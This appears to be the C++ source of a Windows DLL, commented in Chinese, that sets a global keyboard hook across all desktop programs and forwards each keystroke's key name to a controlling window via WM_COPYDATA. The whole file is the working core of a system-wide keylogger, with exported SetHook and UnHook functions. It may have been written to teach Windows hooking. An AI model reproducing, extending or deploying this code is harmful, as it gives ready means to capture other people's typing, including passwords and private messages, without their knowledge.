// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "stdio.h"

HMODULE g_hModule;
HHOOK g_hhk;
HWND g_hWnd;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH://当DLL被加载时
        g_hModule = hModule;
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH://当DLL被释放时
        break;
    }
    return TRUE;
}

//键盘钩子回调函数
LRESULT CALLBACK KeyboardProc(int code, //hook code
    WPARAM wParam,//virtual-key code
    LPARAM lParam)//keystroke-message information
{
    if (code < 0)
    {
        return CallNextHookEx(g_hhk, code, wParam, lParam);
    }
    if (code == HC_ACTION && lParam > 0)
    {
        //获得按键信息
        char Buffer[32] = { 0 };
        GetKeyNameTextA(lParam, Buffer, 32);
        //发送消息
        COPYDATASTRUCT cds;
        cds.dwData = 0;
        cds.cbData = strlen(Buffer) + 1;
        cds.lpData = Buffer;
        SendMessage(g_hWnd, WM_COPYDATA, NULL, (LPARAM)&cds);
    }
    return CallNextHookEx(g_hhk, code, wParam, lParam);
}
//导出函数
bool SetHook(HWND hWnd) {
    g_hWnd = hWnd;
    g_hhk = SetWindowsHookEx(WH_KEYBOARD,//钩子类型
        (HOOKPROC)KeyboardProc,//回调函数
        g_hModule,//第三方注入DLL，全局钩子使用
        0//线程id，填0表示所有桌面程序
    );
    return g_hhk != NULL;
}

bool UnHook() {
    return UnhookWindowsHookEx(g_hhk);
}
